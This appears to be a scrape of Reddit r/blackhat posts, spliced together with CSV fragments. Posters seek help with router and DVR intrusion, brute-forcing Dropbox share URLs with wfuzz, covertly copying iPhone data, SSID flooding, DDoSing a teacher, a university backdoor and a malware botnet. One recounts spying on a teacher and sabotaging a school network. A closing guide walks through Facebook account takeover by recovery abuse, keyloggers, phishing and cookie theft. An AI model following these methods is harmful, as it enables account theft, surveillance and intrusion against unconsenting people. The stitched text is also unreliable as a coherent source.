After firing up Burp Suite, I managed to hack the router user and password... But once in the admin panel, there is a page which shows the two ISP DNS servers, but there is no means to change them.

However, since these routers are individually configured, there must be a ""config.conf"" type file.  One time a year or two ago I had an odd modem/router, and I managed to telnet into it and then did a `dns server route flush` and added Google's DNS servers.

But now I seem to be stuck.  I have nmapped it and it seems that only ports 443 and 80 are open.

What I wanted to know is how I could possible SSH into 443 or port 80? or, in the alternative, somehow ftp into the router perhaps???

I do know the user and password from the browser, but as said, I am unable to change DNS servers.

-I have port forwarded port 80 (as far as I know)
-I have the VMware/VirtualBox network adapter set to bridged
-I Get my internal IP via ifconfig on the console to forward port 80
-My router asks for both a remote and local IP and I punch both in respectively(local ip via ifconfig, remote via whatismyip.com)

It has a directory traversal vulnerability, and i was able to view the hash to telnet into the the DVR. Once i cracked the hash i logged on, but I was looking for the usernames and hashed passwords to the web server, the logins that use basic http auth. I cd'ed around the linux interface running the DVR, and found a Users.xml file that contains this: http://i.imgur.com/Ja5Cq8T.jpg it shows what seems to be a list of user names USER01-USER10 with a 16 character hash next to it. I looked up the 16 digit hashes, they are said to be cisco pix md5. Hashcat returned nothing.....strange thing is I know my dvr only takes numbered passwords, no letters can be used.....yet hashcat returns no hits when i run incremented digit brute force attacks up to 13 characters...So ...is this actually the right hash im using? am i supposed to be including te usernames? Am i even looking at the password hash?

So I figured fuck it may as well just ask, since if this is being done, you guys and grrls could probably already know how to do it. :)


I kind of gave up on wfuzz, it kept crashing on me due to the size of what I was doing. (giant keyspace?) or the string I was giving it caught errors. I think it was just using up all of my memory and kaput. But, since it's relatively similar to brute forcing passwords, there must be a way of doing this. Like instead of generating a string and comparing it to a hash, its generating a string to use in a URI and making a request to find an index at the end of that. I guess a bonus feature of this would be dumping it's booty into a tree like this mockup:

^ I just realized I'm really tired, I spent an hour and a half trying to make that look good. :P


But anyway yeh, that little drawing above would be the output of precisely what I'm trying to accomplish with this post. 

I'm no good at coding, but I imagine the function could work something like this:


* generate 15 char userid string using only alphanumerics. (upper and lowercase)
* make a request using that userid (something like https://drpbx.com/s/userid/index.html) and continue until hitting an index.html.
* list contents of index.html in treelike-format/file.
* wait arbitrary time frame and repeat until breaking.



Like the comment, I thought I could do this with wfuzz, it seems intuitive enough, but whatever I'm doing I think I keep causing it to crash. 



Unless I really am hitting my memory limit, it's more likely I just don't know how to use it for this.




This is the command string I was using if it's of any use:



     ./wfuzz.py -c -z  range,aaaaaaaaaaaaaaa-000000000000000 https://www.dropbox.com/s/FUZZ/index.html




When I run that, it crunches away for aprox. 10 minutes. I know it's definitely doing work, because it renders my VM unresponsive.

She asked me to explain her if it's easy to make it, to learn it, etc.. and I tried to explain to her that from my point of view it's easy to learn, hard to accomplish and even harder to do it by ourselves.. but then she talked about a friend of her that ""hacked"" his ex-girlfriend laptop and turned the webcam on... After this I tried to explain that when we have access to a pc/laptop we can implement local software in order to give us access from roaming, and probably what he did wasn't ""hacking"" but just a virus or software that he implemented in the past that he can use it by now...
I know the basics, I understand how hacking is made this days, but I don't know how to explain everything or how easy it is because I have no experience...

Having access to several laptops under which I control administratively (running Win8/8.1), I want to be able to acquire all relevant data (pictures and SMS messages, primarily) from an iPhone when it is plugged into the computer via USB.

Users on occasion plug their phones into these machines as it is more convenient to charge them there than at an outlet nearby.

729,27bzej,CaliforniaPoppyCock,"New York Public Library's free wifi SSID is ""NYPL"". If someone were to walk into the library with a laptop or smartphone broadcasting hundreds of copies of the SSID ""NYPL"", patrons coming into the library to take advantage of free wifi wouldn't be able to find the real ""NYPL"" and they wouldn't be able to connect. Places that provide free wifi such as airports, restaurants, and schools are also vulnerable.

A laptop with the right network card running MDK3 can do this easily. [Instructions here](http://www.wirelesspentest.com/mdk3fakebeacon.html)

My questions:
1) What android app can be used to do this? All the tethering/portable hotspot apps I've looked at can only broadcast 1 SSID.

761,28co1s,[deleted],"so here is the problem that I am currently dealing with. I have multiple reasons to believe that my whole home network is being hacked and controlled out of my reached. from my wifi to my direct tv service. I also know the feds hire hackers on the side or all together to help them with inflautrating systems.  I am fairly new to learning the capabilities of privacy and any types of hacking. so it I don't really have anything to hide, I would like to have my rights back. I do have a little knowledge though how to control my computer and when false webpages are being shown and I can hardly load any ""true"" software. 
the laptop was bought in march this year so, it doesn't hardly have any data on. its a dell inspiron  with a new Toshiba hard drive in it. mine fail within the first month of having and got the warranty.  
 
so here is the deal, to start with I would like to completely clean my computer, delete all files and restore. problem with that is when I bought my laptop it didn't come a windows start-up disc. I know I can download it on a usb which I plan on doing. I uploaded to 8.1 and there is certain parts of the programs that I cannot change and there is too much data to sort. I can the key off the laptop, but I would still need a disc or file to reinstall windows 8.1. I have tried looking all over for a file and when I do find it I cannot access it. 
would anybody please send me a complete reinstallation file they could add to the comments. I can use my own key to activate it, I would just need a complete file. I would rather just find it online somewhere, but I have come to the point where Im not sure where to turn. if I could get a couple different copies from different sources that would awesome. 
I am also looking intro differents ways to help protect my computer from unwanted viruses and hackers. I do know about vpns, Im starting to learn how to use multiple proxies with vpn. I do have Kaspersky that I bought. and im learning the different ways to stay clear from hacked parts of webpages. it has gotten so bad that I have whole websites replaced now. from facebook to porn site t yahoo and bing and Microsoft. its kinda nuts. I do have and know typecrytp and keepass. don't completely understand it yet but I will. I know of torbowrser but kasper wont let it download because the amount of virus's that are thrown at my system at that point in time. I can do a system check and my computer will be completely clean. 

so what are some other ways to ensure my privacy rights are kept. can u give me some software that I can download, not look up. some information on setups, I heard of cold start to erase all my files. but if my computer would be completely wiped clean. what programs would work best and how to use em. what order should I do them. just any addition information on how to protect myself would be very awesome. tips and tricks. what to watch out for. things like that. I am completely self taught, no school, but I learn very quickly. I also download pythons as well, going to try to grasp that. oh and if someone has a binary conversion software of some sort that would be great also. just something to help me learn programming down the line.
if this is in the wrong sub/reddit please let me know so I can switch it to another one. thanks for thanking the time to read and I would very much appreciate any help or response. 
and you know I do have to say that if the people that are hacking me are ready this. don't be a punk and give me a bunch of bullshit to download. show some love, and at least give me a chance to try and get some distance from you. see I like watching porn and the videos that have been replace in the normal place I look, just suck.

I realize this may or may not be the right place for a question from this end of the spectrum, but it's likely one of the only places on Reddit where people will know what the hell I'm talking about.

The other day I was browsing on a Windows computer. Someone sent me a link to a photo. Long story short, the link was actually a download link, not a link to a webpage with a photo.

So, my browser automatically downloaded something like IMG-4700.jpg.exe (lol)

I obviously didn't open it - I deleted it and then deleted it from my recycle bin, then disconnected from the Internet and ran scans with Malwarebytes, Malwarebytes Anti-Rootkit, and Hitman Pro. Didn't find anything related to what I just downloaded.

So here is my question - is there any way I am infected from this or am I 100% safe because I did not run the program?

The strange fact is: if a test the url found without --crawl options it isn't vulnerable, if i test the same url without --crawl options it is vulnerable!!

Now the admin of the forum have changed the frontpage (only the frontpage) with the login page, so now the --crawl options doesn't found the vulnerable url anymore.

818,2a1bts,throwawayredu,"Hi. I'd like to ask for some advice. I'm leaving university soon so will not have a login to university network. While there I have discovered several vulnerabilities including one major one that gives me permission to execute code on the web server. I'd always considered using it for evil - i.e. finding out how my results were extracted from the database and then changing them but I decided it wasn't worth the risk of being excluded from uni. I need access to the network to upload the code. I could do this by going to the uni campus and using the guest computer login. Or I could leave a simple backdoor (probably a couple of extra lines to an existing page) meaning I don't need network access and just need internet access. The reason I might do this is that it can be useful to have access to a uni ip address that I can proxy through. I doubt I'd ever use it to change things on the webserver like the homepage contents but I obviously could and I might regret it in future if I haven't left the backdoor. I could get some free publicity for something I felt strongly about. Finally I could just send an email to the IT folks at the uni just to alert them to the vulnerabilities (probably in an anonymised fasion) or I could just forget about it.

I'm wondering if there is a solution better than a botnet for work that I need done. I need to perform a massive amount of data analysis, and with my equipment it would take years. For this reason I want to infect computers with a program that is always running in the background, performing analysis.

Each machine would need a specific configuration based on its hardware and software. I could start a botnet and configure each machine one by one (which I already know how to do) or I could make a program that would lead to a tree of downloads. E.g. If windows 7 then download x, elif windows 8 then download y, elif mavericks then download z. And then a similar tree that deals with hardware configuration. I have no idea how to do this ""tree"" of downloads, but it seems easier in the long run and slightly less illegal as I wouldn't have access to personal info on the machines running this malware.

Should I try to make this ""tree"" and, if so, can someone point me toward a guide for something similar to this?

832,2aqe5h,[deleted],"My downstairs neighbor is insanely sensitive to sound, and we live in a terribly constructed building to boot. When I stay up working through the morning hours, no matter how silent I am, she let's me know I'm keeping her up. The bitch put a nail through my tire last week. I know it was her (or her crazy bf) because she was thumping over nothing the night before and I thumped back.

So my Internet access goes down for about an hour at a time almost every day. It seems to go out a few minutes after I first get up to use my computer, whatever time that may be (it varies wildly), and/or at 2am.

I have new replacement coax cables that I've swapped in when it's gone down, and those don't fix it. When down, the Arris TM602G/CT modem provided by Comcast has it's upstream light flashing.

HD cable TV isn't affected though. That's always up.

Could my downstairs neighbor be adding noise that affects the modem only, not the cable box?

Would she be able to do this in a way that only affects me?

What might be a good strategy to nab her?

I often stay up late in my studio apartment working through the night (job requires it). Practically the only sound I make though is getting up for coffee and typing. The dude downstairs, who is home all day and night, has made it abundantly clear he can hear me and is annoyed by any late night sound, slamming on walls when I get up to move around even just a little. Last week I found a nail driven into the side of my car's tire. I'm damn sure it was this dude because the previous night he had been pounding on the walls crazier than ever.

So my cable modem loses the upstream connection most often a few minutes after I get up in the morning and start using the computer (time of day varies wildly), and around 2am.

How might this fucker downstairs be adding noise to the line that knocks out my cable modem but not HDTV? How could he do it while not affecting anyone else in the apartment complex? How might he be nabbed? Or am I being paranoid?

838,2au8ka,pjvex,"I have been using aircrack-ng since 2008.... and I've always just taken it for the ""rule"" that you use airmon-ng to put an interface in monitor or promiscuous mode.

But recently I was writing a bash script and was having problems changing wireless channels and also felt it was confusing to have have a separate mon0 (or whatever) interface because if you are going to spoof your Mac address, you shouldn't typically just spoof your mon0 mac, your original wireless interface should also have the same spoofed mac number. Plus, I've ran into people on the web who thought it was fine to spoof the mac of wlan0, then start their mon0 interface and start to deauth or inject or whatever...not realizing their mon0 address has their real mac address.

Anyway, while writing this script, I just thought it was so much simpler to just do:

`ifconfig wlan0 down `

`iwconfig mode monitor`

{optionally use macchanger or `iwconfig wlan0 hw ether xx:xx:xx:xx:xx:xx` to spoof mac}


`ifconfig wlan0 up`

That's it. Now wlan0 is in promiscuous mode, it's mac is spoofed, and there aren't any `wlan0mon0` or `mon1` interfaces to drive you crazy.

Of course I see the minor benefit of having an interface be renamed to ""monX"" for clarity (but even that wasn't always the case, as it used to change to `ath0` when you used madwifi drivers.  Also, if you run airmon-ng more than once on the first interface, are the resulting multiple monitor mode interfaces actually separate? Seems to me like you could just use wlan0 (your original interface) provided you put it into monitor mode in multiple mdk3 or aireplay-ng attacks.",blackhat,1405494309,14,NA,http://www.reddit.com/r/blackhat/comments/2au8ka/question_regarding_airmonng_whats_the_point/

847,2b6awh,pjvex,"I never really studied WPA2 cracking until recently... back in the WEP days, I figured someone would figure something out before brute-forcing became the only real option.

Some things were figured out... like the once-heralded WPS vulnerability.  But that was discovered  3+ years ago. Since then, manufacturers have been designing their router firmware to lock-down WPS functionality much more agressively, perhaps after only a few incorrect WPS pin attempts spaced closely together.  Some of these routers only lock-out attempts from certain mac addresses... some lock out everyone until the router is reset.  In response to this, the community has found some ways (primarily using MDK3) to DoS the router until it resets itself, unlocking WPS. 

Regarding these aforementioned WPS challenges, people have for awhile been working on various bash scripts which do one or more of the following: (i) randomize the mac address before every WPS pin attempt, or (ii) attempt as many as possible pins before a lockout, then reset/unlock the router and continuing attempts once again from that point.  Hopefully someone will figure out ""the perfect storm"" in a script which will mitigate the effect these firmware changes have had on the WPS vulnerability. 

However, in the meantime, I have been playing with WPA2 and brute-forcing using different methods.  One method in use since ~2009 is to use hash tables (which are like rainbow tables) that contain pre-computed PMKs for various wordlists.  From what I have read, the PMK (which I think is short for pairwise master-key) is created using the shared key *and* the SSID of the AP.  This has then can be brute-forced against a four-way handshake and the time is dramatically reduced.

Usually applications like pyrit or cowpatty use these hash table files. 

Anyway, what I was wondering is if there are different hash table lists for different defualt SSIDs?  I know the Church of Wifi (which I think is defunct) had a script which generated a hash table using the top 100 most popular SSIDs, but I was looking for default SSIDs of routers.  

For instance when you buy a wireless router (or one is given to you by your ISP) the SSID has a default name that is almost always the manufacturer (or an abbreviation of same) with some additional characters appended.  If you do a  Kismet scan anywhere in the world, besides your smart-ass SSID's like ""Pretty Fly for a Wi-Fi"", you will see (and probably more than custom SSIDs) countless routers with SSIDs similar to:  NETGEAR18, 2WIRE127, Belkin50, etc.  

So I was wondering if anyone ever started to run genpmk (to create the hash tables) using a dictionary and these default router names.  I realize there are a lot of different default router names, but people have been actively trying to crack WPA2 for 5 years, and I would think it must have dawned on someone to start putting in the time to create this hashed wordlists using these various default router names.  I would think the market for exchanging same would be pretty active.  That's because the default SSIDs of these routers is fairly constant (even though there are a lot of them with new ones being released all the time), and this consistency is a vulnerability for those who do not bother to change the SSID (just like may do not even bother to change the default user and password of the router).

If anyone has heard anything (or if my understanding of the creation of the PMKs is incorrect), please let me know....",blackhat,1405817963,21,NA,http://www.reddit.com/r/blackhat/comments/2b6awh/regarding_wpawpa2_cracking_with_pmk_hash_files/

This is a utility called Acrilyic which I never thought I'd see on Windows to be honest, but it has all (if not more) features as Kismet does.  It is pretty cool.

Anyway, what you are looking at is a promisc scan of my environment (I am at home at the moment), and you see all of the APs around, plus the little [+] expand box can be clicked to show the STA/clients. I currently have two routers... one is the ""ISeeYouInTheShower"" [**labeled 'A' in the image**] and it is mainly my gateway to the WAN/internet.  I never associate any wireless clients to this unless its an emergency.  Mostly, the name is just a joke.

Off of that router, I have an older Linksys router with DD-WRT... it is immediately below **""ICanSeeYouInTheShower""** cleverly named by the unicode skull &amp; crossbones symbol... (yes, I know I am a cliche so mock me if you will).  This AP is used quite often, but mainly by my Android when I am at home (which is an HTC, and from the image, it does not currently seem to be connected).

Ok... that is the top half of the screen.  The lower half shows something called ""Actions"" which I don't quite understand (documentation wasn't incredibly clear).  As you can see it has my cool jolly roger AP name (I will call this my ""wireless AP""), but below that and to the right, it has what appears to be another device with a mac address of 98:48:4A:13:bb:E4 (vendor: Arris Group) requesting my wireless [**labeled 'B' in the image**]. 

Now I know that phones and other mobile devices will often broadcast (probe-request) to see if there are wireless networks around that they have used before... and that is something that would be easy to pick up.  And I have had friends used this router before, so ostensibly, they may send out probe-requests now and again for my wireless AP.  But my friends are not around at the moment, and chances are if they ironically happened to be visiting my neighbor next door, they would likely connect as I have not changed that passphrase in awhile...

So that rules out probe-requests.  But after that... I am stumped.  I cannot imagine who would be requesting my BSSID....

By the way, if you want to have a nice windows wifi recon/info gathering tool, check out [Acrylic](https://www.tarlogic.com/productos/acrylic-wifi). I would use Chrome because google is better with translating pages... and this site didn't even have the decency to write it in English /s.... 

The utility is pretty cool--especially for someone managing a lot of wireless networks...

868,2bxkur,pjvex,"Ever since I started playing with that FruityWIFi script (posted maybe 2 weeks ago), I have been trying to learn more about creating APs and trying to discover what can be done with them. 

As I started to research these questions, I notice that general FakeAP questions/posts/articles started to show up in 2009, but since BT3 was the main distro at the time (with BT4 by late summer), and given how nascent the interest in infosec was, it was a pretty complicated procedure for most. Pen-testing really hadn't caught on as a legitimate knowledge pursuit by college students, and while there was definitely a community, it was small...plus Linux use was a fraction of what it is today (by average users). 

But the Rogue AP web content/ conversion seemed to reach an apex in 2012/2013. The Mark iv (as a hardware pineapple) was new, and all of a sudden it seemed everyone was doing tutorials on the topic of software-based Rogue APs (mostly using Kali or BT5).

However, while the creator of PwnSTAR deserves a lot of credit for his hard work, he mostly cobbled together older crappy scripts, fixed them up, added some options that were discussed at the Kali forums, and tested it (and he was the first to get this working without issues on Kali)...I still don't feel as if I know a lot of the reasons certain things are done, or why some methods to do certain things are chosen over others.

If you are familiar with this topic, you should recognize these questions... If anyone can answer any of them, I'd be grateful.

1. First, why is airbase-ng used to create the fake AP when for a large percentage of the people who are going to try this have decent PRISM or Atheros based wireless NICs and could use Hostapd instead? Especially since that tool has been patched since late 2012 with Karma, allowing it to respond to probe-requests? I think there is now a similar configuration in airbase-ng that allows some of this Karma functionality, but Hostapd is just a more robust fully featured tool for creating an AP. 

2. After creating an AP (with either airbase-ng or hostapd), does anyone know the benefits of using routing (and NAT) to provide internet to ""victims"" who ultimately connect to the AP -- as opposed to creating a bridge interface (brctl command from the package installed using `apt-get install bridge-utils` )?? There seems to be a lot of necessary modifications to IPTables if you choose the NAT route... 

3. I am just guessing here, but is the reason that using NAT is more favorable is because you would then also create a dhcp server (adding to the ""authenticity"" of a real AP?

4. [I have so many questions, but I'm going to stop with this one because I don't know if anyone who knows this stuff will see this.] Instead of Dhcp server, I have read some people suggest using dnsmasq, although that didn't make sense to me... do these people know what they are talking about? (I would think dnsmasq would be involved in DNS requests)

5. If I get responses at all to these questions, I'll ask more...  But as you can see, these are my efforts at really trying to understand all that is going on behind the scenes. [In other words, I have done a lot of research, and am looking for a discussion...i just don't know if this sub is the best place for this...then again, there does seem to be some bright people here]. 

Also, since ""PwnSTAR"" is just a well written bash script, if anyone would like to look at it, you can find it here: [PwnSTAR]( https://github.com/SilverFoxx/PwnSTAR)

891,2cx8xq,nighthawke75,"Dear Synology users,

We would like to inform you that a ransomware called ""SynoLocker"" is currently affecting some Synology NAS users. This ransomware locks down affected servers, encrypts users’ files, and demands a fee to regain access to the encrypted files.

We have confirmed that the ransomware only affects Synology NAS servers running older versions of DiskStation Manager by exploiting a security vulnerability that was fixed and patched in December, 2013.

Affected users may encounter the following symptoms:

    When attempting to log in to DSM, a screen appears informing users that data has been encrypted and a fee is required to unlock data.
    Abnormally high CPU usage or a running process called “synosync” (which can be checked at Main Menu &gt; Resource Monitor).
    DSM 4.3-3810 or earlier; DSM 4.2-3236 or earlier; DSM 4.1-2851 or earlier; DSM 4.0-2257 or earlier is installed, but the system says no updates are available at Control Panel &gt; DSM Update.

If you have encountered the above symptoms, please shutdown the system immediately and contact our technical support here: https://myds.synology.com/support/support_form.php

If you have not encountered the above symptoms, we strongly recommend downloading and installing DSM 5.0, or any version below:

    DSM 4.3-3827 or later
    DSM 4.2-3243 or later
    DSM 4.0-2259 or later
    DSM 3.x or earlier is not affected

You can manually download the latest version from our Download Center and install it at Control Panel &gt; DSM Update &gt; Manual DSM Update.

If you notice any strange behavior or suspect your Synology NAS server has been affected by the above issue, please contact us at security@synology.com.

We sincerely apologize for any problems or inconvenience this issue has caused our users. We’ll keep you updated with the latest information as we continue to address this issue.

Thank you for your continued patience and support.

Sincerely,

896,2d2f0n,[deleted],"Reading some of these posts has made me realise how malicious I was back in middle school. (Keep in mind, all of this was done via a school computer which had numerous restrictions such as using the inbuilt windows run feature being banned as well as command prompt). I essentially gained access to the staff shared folder by performing a scan of all the school computers using Powershell (essentially the same as cmd, the school admins had overseen it) and using 'net use' which gave me the ability to browse through numerous directories that I should not have been able to browse through. A few months of freedom later, among other things I had implanted numerous programs within certain teachers' startup folders (we used XP) and was humouring myself at seeing their mixed expressions upon logging into their computers. I would often entertain myself by seeing the IT admins rushing around the school with concerned expressions. It was all fun and games until I came upon certain sensitive information that bothered me. 

Since this was not very recent some details may be a little sketchy but I will try my best. I found numerous emails from members of staff discussing (bitching) about a teacher that I actually didn't despise. The emails were labelled as important and discussed the future of this certain employee. It just didn't sit well with me. One of the emails came from a music teacher which I particularly disliked. I had an android phone at the time, so I installed a simply 'spy camera' application which also had the ability to record audio. Anyway, the next day, I made sure that the phone was connected to the school WiFi, and that the spy camera web server was running, and I entered my music class. I got a friend to call my phone while it wasn't on silent so that the teacher would confiscate my phone and (hopefully) take it to her office with her. 

This worked, and one hour later I was sitting in the library at recess on a school computer with headphones on listening intently. I heard numerous conversations as the music teacher walked up to her office. When she reached her office she placed my phone in her desk on a pile of books. I still had audio however, so I kept listening. The next thing I heard absolutely astounded me. I heard the familiar sound of keys being pressed, and over that, I heard the music teacher MUTTER her username as she typed it into her computer. At this point, I cranked the volume, and leaned in to the monitor. As I waited, I heard the music teacher mutter her password. I couldn't believe it. I now had access to a staff account. And her password was practically given to me by her! 

Anyway, later that day I set to work on her account, going through her files, trying to find anything of interest. I placed an ASCII image of a middle finger in a txt file in her startup folder, and changed the default login sound to a MS SAM recording of the text ""I am a fucking bitch who teaches music because I couldn't get into any other courses."" I went through her web history with my justice senses tingling and didn't find anything too interesting. I accessed her Outlook calender (since that is how all the teachers used to coordinate computer lab bookings, etc.) and created a bunch of appointments for ""trimming my vagina"" among other things. 

All this took place over several months, and I continued to find numerous bugs and flaws within my school's network (including my school's website, but that's another story.) I would never have been caught if my friend hadn't bragged to one of our IT teachers that I was a 'pro leet haxor' and that I could 'hack anything wow'. (I strongly disagree with the use of these terms). Long story short, this resulted in a year long ban from school computer use (after this was over I was still strongly monitored), and MANY meetings with apparently 'impressed' IT admins, a concerned principal, an angry mob of teachers, and disappointed parents. These meetings went over exactly what I did, how I did it (I didn't disclose all details), and how they could 'resolve' it. I recieved so many of those 'use your powers for good' speeches that they just seemed to lose their meaning. 

Cut to 2 years later, we are made to do volunteer work at some select organisations as part of an 'expanding horizons' program. I am selected to go to a women-run organisation to help sort out their emails. I get bored, I start messing with their network. Little did I know they had top of the line security systems that recorded everything I did (derp). A couple of weeks later, I have to go with a security guard to the office to apologise to all the women that I had 'stressed out'. As a result of this ordeal I was called in for yet another meeting (this time with even more people, yay!) but this meeting had a more serious feel to it. To summarise, I was told that if I step out of line in ANY way whatsoever with the school's technology, I would be expelled without warning. (Keep in mind this is a private school, upwards of 15k per year). A week after this the entire school system, including the mail server crashed as a result of a couple of scripts I had planted 2 years previously. Nobody could login for over a week, but since I had moved to the senior campus, there was no way of linking the sudden crash to me. Trucks started turning up to the school with some brand new PCs, and I saw IT admins walking around the school with dozens of windows 7 disks. Everybody was happy, because the school was due with an update. Nobody knew I was the one that sparked it.

I have another story to share if there is any interest in it. It is basically from high school where I had advanced with my skillset alot since my middle school self, and I was MUCH more careful with concealing my identity, considering the consequences. Let's just say it involves an SQL database containing the credit card numbers of hundreds of parents and donators to the school.",blackhat,1407589693,1,NA,http://www.reddit.com/r/blackhat/comments/2d2f0n/a_story_from_my_middle_school_years/

918,2elwy5,WhatUnicorn,"Here goes, im a decent pc user, but have never been into blackhat culture or anything. But now is the time - why? 
Well, i go to a boarding school, where they have closed all ports for games, reason?! Well, we cant have the school network get infected with virus, can we?
Real reason? Because we have a power hungry teacher(NOT IT SUPORTER), that uses every opportunity to be a dick, that he can get.

Actually, its kind of not true, not all ports are closed. BattleNet is opened. because Mr. X plays diablo. And thats not a problem, but us students, who pays to go here, we cant get the ports opened for what we play - well actually our nice guy it supporter did open for LOL and Steam, but the, Mr. X got mad - and said ""nahh, i didnt allow that"" and forced him to close the ports again.

As you can hear its not the school that is the problem, not our IT supporter, but just Mr. X who is a power hungry little kid in a big mans body - so now i want to DDOS him every time he logs on to battlenet.

Why? Well maybe he will become tired of it in the end, and we will get our wishes fulfilled, maybe ill just annoy the fuck out of him. Buttom line is that its no illegal, its is just seen as a ""cyper protest"" here in my country (yup some one whent to court after doing a thing like this, and it got ruled it where just a ""cyper protest"")

After that initial time it triggers reaver to think it has found the correct first 4 pin numbers, but never receives another M5 packet.  It appears to be a false M5.  It has happened just a hand full of times but when it causes you to have to restart an attack it can cause quite the headache.

Is there anyway to start reaver after the pin that triggered the false M5?  The -p command assumes you have the first 4 pins which is not the case.

929,2f3u25,ellimistx99,"Hello everyone!


I've found a couple of posts talking about how to hack WITH Android things like dSpolit and various other tools. However a lot of the examples and video's that deal with doing MITM attacks target PC's rather than phones. So I was wondering about doing the same thing on phones. While I understand that a MITM attack on a phone would be the same as on a computer, but I was wondering if things like session hijacker would work if the user was using Apps instead. 



In other words, if I am on my phone using apps like WhatsApp, Gmail, Facebook, Snapchat, etc. instead of my browser... what tools could someone use to sniff my WhatsApp/Snapchat messages/pictures, does such a tool exist? 


Are there any tools out there for specifically targeting phones that don't involve physical access to the phones? Or installing a program (either iOS or Android). 

Edit: I ask because most people use their phones on public hotspots lately and even in their own homes. So a lot of the old session hijacking stuff isn't as... useful or fun. So I'm hoping there are tools for targeting phones that I could explore and learn about.",blackhat,1409514137,1,NA,http://www.reddit.com/r/blackhat/comments/2f3u25/tools_for_sniffing_on_phones_not_with_themxpost/

No success.

Later tried gathering some more info through http://wtfismyip.com/text and typing the response through the cmd with ""type filewtf.txt"" and discovered that they run behind TOR.

1006,2iikf3,BetaWolf1213,"Despite the security concerns that have plagued Facebook for years, most people are sticking around and new members keep on joining. This has led Facebook to break records numbers with over one billion monthly active users as of October 2012—and around 600 million active daily users.

We share our lives on Facebook. We share our birthdays and our anniversaries. We share our vacation plans and locations. We share the births of our sons and the deaths of our fathers. We share our most cherished moments and our most painful thoughts. We divulge every aspect of our lives. We even clamor to see the latest versions even before they're ready for primetime.

But we sometimes forget who's watching.

We use Facebook as a tool to connect, but there are those people who use that connectivity for malicious purposes. We reveal what others can use against us. They know when we're not home and for how long we're gone. They know the answers to our security questions. People can practically steal our identities—and that's just with the visible information we purposely give away through our public Facebook profile.


The scariest part is that as we get more comfortable with advances in technology, we actually become more susceptible to hacking. As if we haven't already done enough to aid hackers in their quest for our data by sharing publicly, those in the know can get into our emails and Facebook accounts to steal every other part of our lives that we intended to keep away from prying eyes.

In fact, you don't even have to be a professional hacker to get into someone's Facebook account.

It can be as easy as running Firesheep on your computer for a few minutes. In fact, Facebook actually allows people to get into someone else's Facebook account without knowing their password. All you have to do is choose three friends to send a code to. You type in the three codes, and voilà—you're into the account. It's as easy as that.

In this article I'll show you these, and a couple other ways that hackers (and even regular folks) can hack into someone's Facebook account. But don't worry, I'll also show you how to prevent it from happening to you.

Method 1: Reset the Password
The easiest way to ""hack"" into someone's Facebook is through resetting the password. This could be easier done by people who are friends with the person they're trying to hack.

The first step would be to get your friend's Facebook email login. If you don't already know it, try looking on their Facebook page in the Contact Info section.
Next, click on Forgotten your password? and type in the victim's email. Their account should come up. Click This is my account.
It will ask if you would like to reset the password via the victim's emails. This doesn't help, so press No longer have access to these?
It will now ask How can we reach you? Type in an email that you have that also isn't linked to any other Facebook account.
It will now ask you a question. If you're close friends with the victim, that's great. If you don't know too much about them, make an educated guess. If you figure it out, you can change the password. Now you have to wait 24 hours to login to their account.
If you don't figure out the question, you can click on Recover your account with help from friends. This allows you to choose between three and five friends.

It will send them passwords, which you may ask them for, and then type into the next page. You can either create three to five fake Facebook accounts and add your friend (especially if they just add anyone), or you can choose three to five close friends of yours that would be willing to give you the password.

How to Protect Yourself
Use an email address specifically for your Facebook and don't put that email address on your profile.
When choosing a security question and answer, make it difficult. Make it so that no one can figure it out by simply going through your Facebook. No pet names, no anniversaries—not even third grade teacher's names. It's as easy as looking through a yearbook.
Learn about recovering your account from friends. You can select the three friends you want the password sent to. That way you can protect yourself from a friend and other mutual friends ganging up on you to get into your account.
Method 2: Use a Keylogger
Software Keylogger

A software keylogger is a program that can record each stroke on the keyboard that the user makes, most often without their knowledge. The software has to be downloaded manually on the victim's computer. It will automatically start capturing keystrokes as soon as the computer is turned on and remain undetected in the background. The software can be programmed to send you a summary of all the keystrokes via email.

CNET has Free Keylogger, which as the title suggests, is free. If this isn't what you're looking for, you can search for other free keyloggers or pay for one.


Hardware Keylogger

These work the same way as the software keylogger, except that a USB drive with the software needs to be connected to the victim's computer. The USB drive will save a summary of the keystrokes, so it's as simple as plugging it to your own computer and extracting the data. You can look through Keelog for prices, but it's bit higher than buying the software since you have the buy the USB drive with the program already on it.


How to Protect Yourself
Use a firewall. Keyloggers usually send information through the internet, so a firewall will monitor your computer's online activity and sniff out anything suspicious.
Install a password manager. Keyloggers can't steal what you don't type. Password mangers automatically fill out important forms without you having to type anything in.
Update your software. Once a company knows of any exploits in their software, they work on an update. Stay behind and you could be susceptible.
Change passwords. If you still don't feel protected, you can change your password bi-weekly. It may seem drastic, but it renders any information a hacker stole useless.
Method 3: Phishing
This option is much more difficult than the rest, but it is also the most common method to hack someone's account. The most popular type of phishing involves creating a fake login page. The page can be sent via email to your victim and will look exactly like the Facebook login page. If the victim logs in, the information will be sent to you instead of to Facebook. This process is difficult because you will need to create a web hosting account and a fake login page.


The easiest way to do this would be to follow our guide on how to clone a website to make an exact copy of the facebook login page. Then you'll just need to tweak the submit form to copy / store / email the login details a victim enters. If you need help with the exact steps, there are detailed instructions available by Alex Long here on Null Byte. Users are very careful now with logging into Facebook through other links, though, and email phishing filters are getting better every day, so that only adds to this already difficult process. But, it's still possible, especially if you clone the entire Facebook website.

How to Protect Yourself
Don't click on links through email. If an email tells you to login to Facebook through a link, be wary. First check the URL (Here's a great guide on what to look out for). If you're still doubtful, go directly to the main website and login the way you usually do.
Phishing isn't only done through email. It can be any link on any website / chat room / text message / etc. Even ads that pop up can be malicious. Don't click on any sketchy looking links that ask for your information.
Use anti-virus &amp; web security software, like Norton or McAfee.
Method 4: Stealing Cookies
Cookies allow a website to store information on a user's hard drive and later retrieve it. These cookies contain important information used to track a session that a hacker can sniff out and steal if they are on the same Wi-Fi network as the victim. They don't actually get the login passwords, but they can still access the victim's account by cloning the cookies, tricking Facebook into thinking the hacker's browser is already authenticated.

Firesheep is a Firefox add-on that sniffs web traffic on an open Wi-Fi connection. It collects the cookies and stores them in a tab on the side of the browser.

From there, the hacker can click on the saved cookies and access the victim's account, as long as the victim is still logged in. Once the victim logs out, it is impossible for the hacker to access the account.


How to Protect Yourself
On Facebook, go to your Account Settings and check under Security. Make sure Secure Browsing is enabled. Firesheep can't sniff out cookies over encrypted connections like HTTPS, so try to steer away from HTTP.
Full time SSL. Use Firefox add-ons such as HTTPS-Everywhere or Force-TLS.
Log off a website when you're done. Firesheep can't stay logged in to your account if you log off.
Use only trustworthy Wi-Fi networks. A hacker can be sitting across from you at Starbucks and looking through your email without you knowing it.
